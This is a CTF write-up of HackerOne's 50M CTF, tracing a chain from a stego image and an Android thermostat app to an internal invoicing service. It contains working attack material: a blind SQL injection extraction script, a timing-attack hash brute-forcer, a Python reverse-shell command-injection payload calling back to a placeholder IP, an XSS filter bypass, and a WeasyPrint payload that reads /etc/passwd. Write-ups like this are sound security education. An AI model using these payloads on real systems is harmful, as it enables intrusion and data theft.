---
comments: true
title: Writeup Hackerone 50M CTF H1 702
date: 2019-03-26 17:00:00 +0000
category:
- ctf
tags:
- hackerone
private: false

---
### Writeup Hackerone 50m CTF

First stage of this ctf we need to solve an hidden file from an image which posted by HackerOne at twitter [https://twitter.com/hacker0x01/status/1100543680383832065?lang=en](https://twitter.com/hacker0x01/status/1100543680383832065?lang=en).

I tried to run bunch of steganography tools and i found something with `zteg` the exact command is `zteg -a h1-stege.png`

    ➜  h1702 zsteg -a h1-stege.png
    [..SNIP..]
    imagedata           .. text: "E_B.\n3T|="
    b6,bgr,lsb,xy,prime .. text: "YETYEWUU"
    b7,b,msb,xy,prime   .. text: "(4:M &Q(42"
    b1,rgb,lsb,yx       .. zlib: data="https://bit.do/h1therm", offset=5, size=22
    b2,rgb,lsb,yx       .. file: PGP\011Secret Sub-key -
    b3,r,lsb,yx         .. text: "Q.L\n4Af^"
    [..SNIP..]

and i got the valid zlib file, and the link is `https://bit.do/h1therm` is a shortener link to and google drive files that lead us to an android apk thermostat.

    $ curl -v https://bit.do/h1therm
    > GET /h1therm HTTP/1.1
    > Host: bit.do
    > User-Agent: curl/7.52.1
    > Accept: */*
    >
    < HTTP/1.1 301 Moved Permanently
    < Date: Wed, 27 Feb 2019 15:51:35 GMT
    < Server: Apache/2.2.34 (Amazon)
    < Location: https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view?usp=sharing
    < Content-Length: 363
    < Connection: close
    < Content-Type: text/html; charset=iso-8859-1

### The Thermostat App

First i try to decompile the apk using `jadx` it takes me a while to understand the application workflow, the request and response to the backend server is encrypted by an `AES` but the flaws is they stored the secret key hardcoded in the apk

        protected Response<String> parseNetworkResponse(NetworkResponse networkResponse) {
            try {
                Object decode = Base64.decode(new String(networkResponse.data), 0);
                Object obj = new byte[16];
                System.arraycopy(decode, 0, obj, 0, 16);
                Object obj2 = new byte[(decode.length - 16)];
                System.arraycopy(decode, 16, obj2, 0, decode.length - 16);
                Key secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, "AES");
                AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec(obj);
                Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
                instance.init(2, secretKeySpec, ivParameterSpec);
                JSONObject jSONObject = new JSONObject(new String(instance.doFinal(obj2)));
                if (jSONObject.getBoolean("success")) {
                    return Response.success(null, getCacheEntry());
                }
                return Response.success(jSONObject.getString("error"), getCacheEntry());
            } catch (Exception unused) {
                return Response.success("Unknown", getCacheEntry());
            }
        }

the secret key is :

    Key secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, "AES");

so i able to re-implement the encrypt/decrypt function and able to send an plain json request, so i create a flask web app that act like a proxy to `catch the plain json request -> encrypt request -> send encrypted request -> get encrypted response -> decrypt encrypted response -> return plaintext response`.

    #!/usr/bin/env python2
    from Crypto.Cipher import AES
    from Crypto import Random
    import os
    import base64
    import requests
    import urllib
    import json
    import flask
    
    app = flask.Flask(__name__)
    key = "".join(["\x38","\x4F","\x2E","\x6A","\x1A","\x05","\xE5","\x22","\x3B","\x80","\xE9","\x60","\xA0","\xA6","\x50","\x74"])
    iv = str(os.urandom(16))
    
    headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6A MIUI/V9.6.18.0.OCBMIFD)", 
    "Connection": "close", 
    "Accept-Encoding": "gzip, deflate"
    }
    
    def r_pad(payload, block_size=16):
        length = block_size - (len(payload) % block_size)
        return payload + chr(length) * length
    
    def encrypt(raw):
        cipher = AES.new(key, AES.MODE_CBC,iv)
        ct_bytes = cipher.encrypt(r_pad(raw))
        obj2 = iv + ct_bytes
        ct = base64.b64encode(obj2).decode('utf-8')
        return ct
    
    def decrypt(enc):
        encs = base64.b64decode(enc)
        obj = encs[0:16]
        cipher = AES.new(key, AES.MODE_CBC, obj)
        # print("The message was: ", cipher.decrypt(encs), len(cipher.decrypt(encs)))
        pt = cipher.decrypt(encs)[16:].split("}")[0]+"}"
        print "[RESPONSE]: " + pt
        return pt
    
    def make_request(jsondata):
        raw_data = json.dumps(jsondata)
        enc = encrypt(raw_data)
        enc_data = urllib.quote_plus(enc+"\n")
        print "[RAW]: "+raw_data
        print "[ENC_DATA]: "+enc
        r = requests.post('http://35.243.186.41/', data={"d": enc}, headers=headers)
        dec_data = decrypt(r.content)
        # print decrypt(enc)
        return dec_data, r.status_code
    
    @app.route('/', defaults={'u_path': ''})
    @app.route('/<path:u_path>')
    def main(u_path):
        url = 'http://35.243.186.41' + flask.request.full_path[:-1]
        print 'URL: ' + url
        r = requests.get(url)
        return r.content, r.status_code
    
    @app.route('/login', methods=['POST','GET'])
    def login():
        if flask.request.method == "GET":
            return """
            <form action="/login" method="POST">
                <input type="text" name="user">
                <input type="text" name="pass">
                <input type="hidden" name="cmd" value="getTemp">
                <input type="hidden" name="temp" value="81">
                <input type="submit">
            </form>
            """
        else:
            username = flask.request.form['user']
            password = flask.request.form['pass']
            cmd = flask.request.form['cmd']
            req_data = {'username':username,'password':password,'cmd':cmd}
            if cmd == "setTemp":
                req_data = {'username':username,'password':password,'cmd':cmd,'temp':flask.request.form['temp']}
    
            return make_request(req_data)
    
    app.run(debug = True)

after doing some fuzzing i found that the application is vulnerable to an blind sql injection boolean-based , so i made a python scripts to automate the exploit.

    #!/usr/bin/env python2
    import requests
    import re
    from StringIO import StringIO
    from pycurl import *
    import os
    
    
    url = "http://127.0.0.1:5000/login"
    payload = {
        "user":"",
        "pass":"xxxx",
        "cmd":"getTemp"
    }
    headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6A MIUI/V9.6.18.0.OCBMIFD)", 
    "Connection": "close", 
    "Accept-Encoding": "gzip, deflate"
    }
    
    
    def check(data):
        print data.elapsed.total_seconds()
        if data.elapsed.total_seconds() > 1:
            return False
        else:
            return True
    
    def check2(data):
        # print data.text
        return re.search("Invalid username or password", data.text)
    
    def blind(kolom,table):
        passwd = ""
        idx = 1
    
        while (True):
            lo = 1
            hi = 255
            temp = -1
            while(lo <= hi):
                mid = (lo + hi) / 2         
                # payload["user"] = "' or (SELECT CASE when (ascii(substr({},{},1)) <= {}) THEN 1 ELSE sleep(1) END {}) or '".format(str(kolom),str(idx),str(mid),str(table))
                payload["user"] = "' or (SELECT CASE when (select ascii(substr({},{},1)) {}) <= {} THEN (select 1) ELSE (select 1 union select 2) END) or '".format(str(kolom),str(idx),str(table),str(mid))
                # payload["user"] = "' or (select if(true, (select 1), (select 1 union select 2))) or '"
                res = requests.post(url,data=payload, headers=headers)
                # print payload["user"]
                if check2(res):
                   hi = mid-1
                   temp = mid
                else:
                   lo = mid+1
                   
            if (hi == 0): break
            passwd += chr(temp)
            res = ""
            print "Result [{}]: {}".format(table,passwd)
            idx += 1
    
        return passwd
       
    
    
    # blind("user()","")
    # Result []: root@localhost
    
    # blind("@@version","")
    # Result []: 10.1.37-MariaDB-0+deb9u1
    
    # blind("database()","")
    # Result []: flitebackend
    
    # blind("schema()","")
    # Result []: flitebackend
    
    # blind("table_name","from information_schema.tables where table_name!='devices'")
    # blind("table_name","from information_schema.tables where table_schema=schema()")
    # Result [from information_schema.tables where table_schema=schema()]: devices
    # Result [from information_schema.tables where table_name!='devices']: users
    
    # blind("column_name","from information_schema.columns where table_name='devices'")
    # blind("column_name","from information_schema.columns where table_name='devices' and column_name!='id'")
    # blind("column_name","from information_schema.columns where table_name='devices' and column_name not in ('id','ip')")
    # id, ip
    
    # blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id')")
    # blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id','username')")
    # blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id','username','password')")
    # blind("column_name","from information_schema.columns where table_name='users' and column_name not in ('id','username','password','USER')")
    # id, username, password, USER
    
    # blind("password","from users where username='admin'")
    # 1, admin, 5f4dcc3b5aa765d61d8327deb882cf99 (password)
    # 
    
    blind("group_concat(ip)","from devices")
    # 1, 10.176.194.225
    # 2, 244.181.238.206
    # 3, 243.221.130.19
    
    
    # x' AND 6492=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(ip AS CHAR),0x20) 
    # FROM flitebackend.devices ORDER BY id LIMIT 2,1),6,1))>87) THEN 6492 ELSE 
    # (SELECT 4509 UNION SELECT 4483) END))-- Ysdo

after that i got couple of information from the databases have 2 tables that have schema other than `information_schema` which is `users and devices`, from users table i got an admin credentials with username: admin and password: password but it was not quite usefull and from another table `devices` i got list of an ipaddress i tried run a `ping sweep` using this command  :

    for x in `cat ip_addr`; do ping -c 1 -W 1 $x | grep from; done

to the ipaddress list and found one `ipaddress` that accessible, which is http://104.196.12.98/ the next target that we should pwn.

### FliteThermostat Admin

after trying to understand the application, i notice a difference when send a valid hash length (64) and send a less than 64 character and made me think there is an timing attack, i tried to fuzz the first byte of the hash and notice have one longer response (when the byte is correct)  so i made a python script to automate the exploitation proccess, i made an flask web application that act like an proxy to send the encrypted request to target server.

 {% gist 13f429ec0e74e2c98b44f53edf96d1b6 %}

the flask app is simply take an user&password and then encrypt the value using javascript function provided in the target application.

    #!/usr/bin/env python2
    import requests
    import string
    from tqdm import tqdm
    import random
    
    url = "http://127.0.0.1:5000/flite"
    
    hashnya = "f9{}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    while True:
    	basket = {"time":0,"hex":"xx"}
    	fname  = hashnya.split("{}")[0] + "_"+str(random.random())[2:]
    	for x in tqdm(range(256)):
    		ress = open("result/" + fname,"a")
    		tmp = "%0.2x" % x
    		# print hashnya.format(tmp)
    		req = requests.post(url,data={"hash":hashnya.format(tmp)})
    		req_time = req.text
    		# req_time = req.elapsed.total_seconds()
    		if float(basket["time"]) < float(req_time):
    			basket["time"] = float(req_time)
    			basket["hex"] = tmp
    		ress.write("Bytes: " + str(tmp)+" "+str(req_time)+"\n")
    		ress.close()
    		print "\nBytes: " + str(tmp),str(req_time)+"\n"
    	hashnya = hashnya.format(basket["hex"]+"xx").split("xx")[0]+"{}"+"a"*(64-(len(hashnya.format("xx").split("xx")[0])+4))
    	print "Current Hash: " + str(hashnya)

this exploit is send request to the proxy (flask application) and then analyze the response time which is returned in the body response from the flask app and then save all the response time to text file to help me manually analyze the response because sometime the timing just messed up.

running out the scripts multiple times and finally get the correct hash to login into the application.

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 0.9x - 1.2x)
    f9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 1.4x - 1.7x)
    f986aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 2.0x - 2.3x)
    f9865aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 2.4x - 2.8x)
    f9865a49aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 2.9x - 3.1x)
    f9865a4952aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 3.4x - 3.6x)
    f9865a4952a4aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 3.7x - 4.1x)
    f9865a4952a4f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 4.2x - 4.5x)
    f9865a4952a4f5d7aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 4.7x - 4.9x)
    f9865a4952a4f5d74baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 5.1x - 5.3x)
    f9865a4952a4f5d74b43aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 5.7x - 6.2x)
    f9865a4952a4f5d74b43f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 6.2x - 6.4x)
    f9865a4952a4f5d74b43f355aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 6.7x - 6.9x)
    f9865a4952a4f5d74b43f3558faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 7.2x - 7.6x) [8f]
    f9865a4952a4f5d74b43f3558fedaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 7.7x - 8.1x) [ed]
    f9865a4952a4f5d74b43f3558fed6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 8.2x - 8.4x) [6a][still not sure]
    f9865a4952a4f5d74b43f3558fed6a02aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 8.4x - 8.9x) [02]
    f9865a4952a4f5d74b43f3558fed6a0225aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 9.4x - 9.5x) [25]
    f9865a4952a4f5d74b43f3558fed6a0225c6aaaaaaaaaaaaaaaaaaaaaaaaaaaa ( 9.5x - 9.9x) [c6]
    f9865a4952a4f5d74b43f3558fed6a0225c687aaaaaaaaaaaaaaaaaaaaaaaaaa ( 10.0 - 10.4) [87]
    f9865a4952a4f5d74b43f3558fed6a0225c6877faaaaaaaaaaaaaaaaaaaaaaaa ( 10.9 - 11.1) [7f]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fbaaaaaaaaaaaaaaaaaaaaaaa ( 11.2 - 11.4) [ba]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60aaaaaaaaaaaaaaaaaaaa ( 11.8 - 11.9) [60]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2aaaaaaaaaaaaaaaaaa ( 12.1 - 12.3) [a2]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250aaaaaaaaaaaaaaaa ( 12.7 - 13.4) [50]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcaaaaaaaaaaaaaa ( 13.3 - 13.6) [bc]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbdaaaaaaaaaaaa ( 13.8 - 14.0) [bd]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7aaaaaaaaaa ( 14.0 - 14.4) [e7]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753aaaaaaaa ( 14.7 - 14.9) [53]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5aaaaaa ( 15.1 - 15.5) [f5]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5dbaaaa ( 1 - 15.9) [db]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13aa ( 16.4) [13]
    f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8 ( 16.9 ) [d8]

And got a `session` cookie when logged in using the correct hash, at the first time i thought that was an `JWT` but it was not, that was an Flask session token which structured as `[Payload].[Expiry].[Signature]` , tried an attack to find if the session generated using a weak key but it was not working.

After  strugling around i found that `http://104.196.12.98/update?port=80` have a hidden parameter `port` and i just think there must be another hidden parameter and i make a custom wordlist to bruteforce the parameter using burp intruder and found another `update_host` as a valid parameter reflecting to the output.

the `update_host` parameter is vulnerable to Remote Code Execution we can execute any arbitary code just by using a backtick.

![](/uploads/rce1.PNG)

create a reverse shell using python

     http://104.196.12.98/update?port=80&update_host=`python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22YOUR_IP%22,1212));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27`

and then `python -c 'import pty;pty.spawn("/bin/bash")'` to spawn a TTY, I realize that we still on a container and scanning the network give me other internal application called `Accounting` and i create remote port forwarding using an ssh

    ssh -v -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -fN -R IP_ADDR:8663:172.28.0.3:80 abdilahrf@IP_ADDR

![](/uploads/accounting.PNG)

And again the application is behave diferently when i try to inject the parameter password with SQL Injection, after 2 days for looking any working exploits i just realize another way to get in to the application in [http://IP_ADDR:8663/invoices](http://IP_ADDR:8663/invoices) they have an HTML Comment to [http://IP_ADDR:8663/invoices/new](http://IP_ADDR:8663/invoices/new) which doesn't ask for any authentication, so the authentication is an rabbit hole 100%.

after a while i found that the application is detecting substring of `script` and remove the string i can abuse that to bypass any filter used in the application like close tag filter and even bypass the chrome auditor.

to close tag i can use `<script/style>` so we can close the style tag and do something else, on  the preview i got an xss using this payload :

    http://IP_ADDR:8663/invoices/preview?d=%7B+%22companyName%22%3A+%22Hackerone%22%2C+%22email%22%3A+%22administrator%40hackerone.com%22%2C+%22invoiceNumber%22%3A+%221337%22%2C+%22date%22%3A+%221337-1337-01%22%2C+%22items%22%3A+%5B+%5B%221%22%2C+%22%22%2C+%22%22%2C+%2210%22%5D+%5D%2C+%22styles%22%3A+%7B+%22body%22%3A+%7B+%22background-color%22%3A+%22white%22%2C+%22%3Cscript%2Fstyle%3E%3Cscrscriptipt%3Ealescriptrt%281337%29%3B%3Cscript%2Fscrscriptipt%3E%3Ch2+id%3D%27result%27%3Ex%3Cscript%2Fh2%3E%22%3A%22x%22+%7D+%7D+%7D

tried to embed an image and i got response from the server which say the user agent `weasyprint 44`

![](/uploads/weasyprint.jpg)

after reading the github repository to get an idea how `weasyprint` work i found that, they didn't support javascript at all so the attack vector using javascript is gone, and also for render the `SVG` they using an `CairoSVG` which is already use `defusedxml` so we cannot do an `XXE` too here.

struggling around and found that we able to abuse the feature from `weasypdf`

![](/uploads/feature.PNG)

that feature is allow us to embed any file to the pdf, so i try to embed /etc/passwd using this payload :

    {
      "companyName": "Hackerone",
      "email": "administrator@hackerone.com",
      "invoiceNumber": "1337",
      "date": "1337-1337-01",
      "items": [
        [
          "1",
          "",
          "",
          "10"
        ]
      ],
      "styles": {
        "body": {
          "background-color": "white",
          "<script/style><a rel='attachment' href='file:///etc/passwd'>file<script/a><style>*{background-image": "url('')"
        }
      }
    }
    
    URL ENCODED:
    %7B%0D%0A++%22companyName%22%3A+%22Hackerone%22%2C%0D%0A++%22email%22%3A+%22administrator%40hackerone.com%22%2C%0D%0A++%22invoiceNumber%22%3A+%221337%22%2C%0D%0A++%22date%22%3A+%221337-1337-01%22%2C%0D%0A++%22items%22%3A+%5B%0D%0A++++%5B%0D%0A++++++%221%22%2C%0D%0A++++++%22%22%2C%0D%0A++++++%22%22%2C%0D%0A++++++%2210%22%0D%0A++++%5D%0D%0A++%5D%2C%0D%0A++%22styles%22%3A+%7B%0D%0A++++%22body%22%3A+%7B%0D%0A++++++%22background-color%22%3A+%22white%22%2C%0D%0A++++++%22%3Cscript%2Fstyle%3E%3Ca+rel%3D%27attachment%27+href%3D%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3Efile%3Cscript%2Fa%3E%3Cstyle%3E%2A%7Bbackground-image%22%3A+%22url%28%27%27%29%22%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D

and using `pdfdetach` to extract the embeded file from the PDF.

    ➜  dump pdfdetach -saveall etcpasswd.pdf
    ➜  dump cat passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/bin/false
    nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false
    messagebus:x:102:103::/var/run/dbus:/bin/false
    ➜  dump

we able to read the filesystem, now the problem is to read source code of the application, after a while i found that able to read from `/proc/` path so i embed `/proc/self/cmdline` and i found the command used to run the program with the parameter is `/usr/local/bin/uwsgi --ini /etc/uwsgi/uwsgi.ini`  try to read `/etc/uwsgi/uwsgi.ini` to find the application path without any luck.

and after i check the environment here  `/proc/self/environment`  i found there is another configuration file `/app/uwsgi.ini`

    NGINX_WORKER_PROCESSES=1
    UWSGI_CHEAPER=2
    NGINX_MAX_UPLOAD=0
    SUPERVISOR_GROUP_NAME=uwsgi
    PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    HOME=/root
    UWSGI_PROCESSES=16
    LANG=C.UTF-8
    SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
    PYTHON_VERSION=3.7.2
    SHLVL=0
    PYTHON_PIP_VERSION=19.0.1
    SUPERVISOR_ENABLED=1
    NJS_VERSION=1.15.8.0.2.7-1~stretch
    UWSGI_INI=/app/uwsgi.ini
    NGINX_VERSION=1.15.8-1~stretch
    STATIC_PATH=/app/static
    GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
    PYTHONPATH=/app
    STATIC_URL=/static
    SUPERVISOR_PROCESS_NAME=uwsgi
    FLAG=nice try
    LISTEN_PORT=80
    HOSTNAME=593f273e8b3e
    PWD=/app

Reading `/app/uwsgi.ini` give information about the module name so we can read `/app/main.py` since we already know the path is `/app` from `/proc/self/environ`

    [uwsgi]
    module = main
    callable = app
    #listen = 16384
    lazy-apps = true
    master = true
    processes = 100
    max-requests = 1000
    #logto = /var/log/uwsgi.log
    harakiri = 45

reading `/app/main.py` give us the application code.

    """
    CONGRATULATIONS!
    
    If you're reading this, you've made it to the end of the road for this CTF.
    
    Go to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.
    Make sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!
    
    Congratulations again, and I'm sorry for the red herrings. :)
    """

![](/uploads/solved.PNG)